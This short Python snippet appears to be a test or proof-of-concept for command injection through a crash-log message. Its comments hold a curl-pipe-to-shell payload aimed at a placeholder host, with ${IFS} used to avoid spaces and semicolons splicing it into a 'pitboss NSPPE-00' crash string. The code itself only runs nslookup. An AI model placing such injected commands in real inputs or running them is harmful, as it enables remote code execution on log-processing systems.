# curl${IFS}-sk${IFS}example.invalid|sh
# pitboss NSPPE-00;curl${IFS}-sk${IFS}example.invalid|sh;# unexpectedly died
import subprocess
crash = 'pitboss NSPPE-00 unexpectedly died'
subprocess.run(['nslookup', 'example.invalid'])
